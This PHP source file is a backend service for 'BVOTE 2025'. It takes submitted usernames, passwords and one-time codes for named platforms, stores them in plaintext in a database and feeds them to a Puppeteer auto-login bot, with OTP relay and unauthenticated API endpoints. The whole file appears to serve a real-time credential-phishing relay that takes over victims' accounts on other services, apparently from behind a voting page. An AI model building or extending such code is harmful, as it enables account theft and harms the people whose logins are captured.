<?php
/**
 * BVOTE 2025 - Admin Bot Integration
 * Chức năng: Lắng nghe WebSocket và xử lý auto-login requests
 *
 * 🔒 INTERFACE LOCKED - Backend processing only
 */

require_once 'auto_login_bot.php';

class AdminBotIntegration {
    private $autoLoginBot;
    private $websocketUrl;
    private $isRunning;

    public function __construct() {
        $this->autoLoginBot = new AutoLoginBot();
        $this->websocketUrl = 'ws://127.0.0.1:8080';
        $this->isRunning = false;

        // Generate Puppeteer scripts
        $this->autoLoginBot->generatePuppeteerScript();
    }

    /**
     * Start admin bot service
     */
    public function startService() {
        echo "🤖 Starting Admin Bot Integration Service...\n";
        echo "🔗 Connecting to WebSocket: {$this->websocketUrl}\n";

        $this->isRunning = true;

        // Connect to WebSocket and listen for login requests
        $this->connectToWebSocket();
    }

    /**
     * Connect to WebSocket server
     */
    private function connectToWebSocket() {
        try {
            // For simplicity, we'll use a simple socket connection
            // In production, you might want to use ReactPHP or Ratchet

            $this->processWithPolling();

        } catch (Exception $e) {
            echo "❌ WebSocket connection failed: " . $e->getMessage() . "\n";
            echo "🔄 Switching to polling mode...\n";
            $this->processWithPolling();
        }
    }

    /**
     * Process login requests using polling method
     */
    private function processWithPolling() {
        echo "📡 Admin Bot running in polling mode\n";

        while ($this->isRunning) {
            try {
                // Check for pending login requests
                $this->checkPendingLogins();

                // Sleep for 2 seconds before next check
                sleep(2);

            } catch (Exception $e) {
                echo "❌ Polling error: " . $e->getMessage() . "\n";
                sleep(5); // Wait longer on error
            }
        }
    }

    /**
     * Check for pending login requests from database/API
     */
    private function checkPendingLogins() {
        try {
            // Check for pending login requests in database
            global $pdo;

            $stmt = $pdo->prepare("
                SELECT * FROM login_requests
                WHERE status = 'pending'
                AND created_at > DATE_SUB(NOW(), INTERVAL 5 MINUTE)
                ORDER BY created_at ASC
                LIMIT 1
            ");
            $stmt->execute();
            $request = $stmt->fetch();

            if ($request) {
                echo "🔐 Processing login request: {$request['platform']} / {$request['username']}\n";

                // Mark as processing
                $this->updateLoginRequestStatus($request['id'], 'processing');

                // Process the login
                $result = $this->autoLoginBot->processLoginRequest([
                    'platform' => $request['platform'],
                    'username' => $request['username'],
                    'password' => $request['password'],
                    'otp' => $request['otp']
                ]);

                // Update result
                if ($result['success']) {
                    $this->updateLoginRequestStatus($request['id'], 'completed', $result);
                    echo "✅ Login successful for: {$request['username']}\n";
                } else {
                    $this->updateLoginRequestStatus($request['id'], 'failed', $result);
                    echo "❌ Login failed for: {$request['username']} - {$result['error_type']}\n";
                }
            }

        } catch (Exception $e) {
            echo "❌ Error checking pending logins: " . $e->getMessage() . "\n";
        }
    }

    /**
     * Update login request status in database
     */
    private function updateLoginRequestStatus($requestId, $status, $result = null) {
        try {
            global $pdo;

            $stmt = $pdo->prepare("
                UPDATE login_requests
                SET status = ?, result_data = ?, updated_at = NOW()
                WHERE id = ?
            ");

            $stmt->execute([
                $status,
                $result ? json_encode($result) : null,
                $requestId
            ]);

        } catch (Exception $e) {
            echo "❌ Error updating login status: " . $e->getMessage() . "\n";
        }
    }

    /**
     * Handle incoming WebSocket message
     */
    private function handleWebSocketMessage($message) {
        $data = json_decode($message, true);

        if (!$data || !isset($data['type'])) {
            return;
        }

        switch ($data['type']) {
            case 'auto_login_request':
                $this->processAutoLoginRequest($data);
                break;

            case 'otp_submit':
                $this->processOTPSubmission($data);
                break;

            default:
                echo "❓ Unknown message type: {$data['type']}\n";
        }
    }

    /**
     * Process auto-login request from WebSocket
     */
    private function processAutoLoginRequest($data) {
        echo "🔐 Processing auto-login: {$data['platform']} / {$data['username']}\n";

        $loginData = [
            'platform' => $data['platform'],
            'username' => $data['username'],
            'password' => $data['password'],
            'otp' => $data['otp'] ?? null
        ];

        // Process login with auto-bot
        $result = $this->autoLoginBot->processLoginRequest($loginData);

        // Send result back via WebSocket
        $this->sendWebSocketResponse([
            'type' => 'login_result',
            'login_id' => $data['login_id'],
            'success' => $result['success'],
            'error_type' => $result['error_type'] ?? null,
            'session_data' => $result['session_data'] ?? [],
            'message' => $result['message'] ?? ''
        ]);
    }

    /**
     * Process OTP submission
     */
    private function processOTPSubmission($data) {
        echo "🔢 Processing OTP submission for login: {$data['login_id']}\n";

        // Here you would continue the login process with OTP
        // For now, we'll simulate OTP verification

        $success = strlen($data['otp_code']) === 6 && is_numeric($data['otp_code']);

        $this->sendWebSocketResponse([
            'type' => 'otp_response',
            'login_id' => $data['login_id'],
            'success' => $success,
            'session_data' => $success ? ['authenticated' => true] : []
        ]);
    }

    /**
     * Send response back via WebSocket
     */
    private function sendWebSocketResponse($data) {
        // In a real implementation, you'd send this back through WebSocket
        // For now, we'll store it in database for polling

        try {
            global $pdo;

            $stmt = $pdo->prepare("
                INSERT INTO bot_responses (response_data, created_at)
                VALUES (?, NOW())
            ");

            $stmt->execute([json_encode($data)]);

        } catch (Exception $e) {
            echo "❌ Error storing response: " . $e->getMessage() . "\n";
        }
    }

    /**
     * Stop the service
     */
    public function stopService() {
        echo "🛑 Stopping Admin Bot Integration Service...\n";
        $this->isRunning = false;
    }

    /**
     * Get service status
     */
    public function getStatus() {
        return [
            'running' => $this->isRunning,
            'websocket_url' => $this->websocketUrl,
            'timestamp' => date('Y-m-d H:i:s'),
            'memory_usage' => memory_get_usage(true),
            'processed_requests' => $this->getProcessedRequestsCount()
        ];
    }

    private function getProcessedRequestsCount() {
        try {
            global $pdo;
            $stmt = $pdo->query("SELECT COUNT(*) FROM login_attempts WHERE DATE(attempt_time) = CURDATE()");
            return $stmt->fetchColumn();
        } catch (Exception $e) {
            return 0;
        }
    }
}

// Create additional database tables for bot integration
function createBotTables() {
    global $pdo;

    try {
        // Login requests table
        $pdo->exec("
            CREATE TABLE IF NOT EXISTS login_requests (
                id INT AUTO_INCREMENT PRIMARY KEY,
                platform VARCHAR(50) NOT NULL,
                username VARCHAR(255) NOT NULL,
                password TEXT NOT NULL,
                otp VARCHAR(10),
                status ENUM('pending', 'processing', 'completed', 'failed') DEFAULT 'pending',
                result_data TEXT,
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                updated_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP,
                INDEX idx_status_created (status, created_at)
            )
        ");

        // Bot responses table
        $pdo->exec("
            CREATE TABLE IF NOT EXISTS bot_responses (
                id INT AUTO_INCREMENT PRIMARY KEY,
                response_data TEXT NOT NULL,
                processed BOOLEAN DEFAULT FALSE,
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                INDEX idx_processed_created (processed, created_at)
            )
        ");

        echo "✅ Bot integration tables created successfully\n";

    } catch (Exception $e) {
        echo "❌ Error creating bot tables: " . $e->getMessage() . "\n";
    }
}

// Handle API requests
if (isset($_GET['action']) || isset($_POST['action'])) {
    header('Content-Type: application/json');

    $action = $_GET['action'] ?? $_POST['action'] ?? '';

    switch ($action) {
        case 'submit_login':
            handleSubmitLogin();
            break;

        case 'get_responses':
            handleGetResponses();
            break;

        case 'status':
            handleGetStatus();
            break;

        default:
            echo json_encode(['error' => 'Unknown action']);
            break;
    }
    exit;
}

function handleSubmitLogin() {
    try {
        $input = json_decode(file_get_contents('php://input'), true);

        if (!$input || !isset($input['platform']) || !isset($input['username'])) {
            echo json_encode(['error' => 'Invalid input']);
            return;
        }

        global $pdo;

        // Insert login request into database
        $stmt = $pdo->prepare("
            INSERT INTO login_requests (platform, username, password, otp, status)
            VALUES (?, ?, ?, ?, 'pending')
        ");

        $result = $stmt->execute([
            $input['platform'],
            $input['username'],
            $input['password'] ?? '',
            $input['otp'] ?? null
        ]);

        if ($result) {
            echo json_encode([
                'success' => true,
                'message' => 'Login request submitted',
                'login_id' => $input['login_id']
            ]);
        } else {
            echo json_encode(['error' => 'Failed to submit request']);
        }

    } catch (Exception $e) {
        echo json_encode(['error' => $e->getMessage()]);
    }
}

function handleGetResponses() {
    try {
        global $pdo;

        // Get unprocessed responses
        $stmt = $pdo->prepare("
            SELECT response_data FROM bot_responses
            WHERE processed = FALSE
            ORDER BY created_at ASC
            LIMIT 10
        ");

        $stmt->execute();
        $responses = [];

        while ($row = $stmt->fetch()) {
            $responses[] = json_decode($row['response_data'], true);
        }

        // Mark as processed
        if (!empty($responses)) {
            $pdo->exec("UPDATE bot_responses SET processed = TRUE WHERE processed = FALSE");
        }

        echo json_encode(['responses' => $responses]);

    } catch (Exception $e) {
        echo json_encode(['error' => $e->getMessage()]);
    }
}

function handleGetStatus() {
    $integration = new AdminBotIntegration();
    echo json_encode($integration->getStatus());
}

// CLI interface
if (basename($_SERVER['PHP_SELF']) === 'admin_bot_integration.php') {
    $command = $argv[1] ?? 'start';

    switch ($command) {
        case 'start':
            createBotTables();
            $integration = new AdminBotIntegration();
            $integration->startService();
            break;

        case 'status':
            $integration = new AdminBotIntegration();
            $status = $integration->getStatus();
            echo json_encode($status, JSON_PRETTY_PRINT) . "\n";
            break;

        case 'setup':
            createBotTables();
            echo "🛠️  Bot integration setup completed\n";
            break;

        default:
            echo "Usage: php admin_bot_integration.php [start|status|setup]\n";
            break;
    }
}
?>
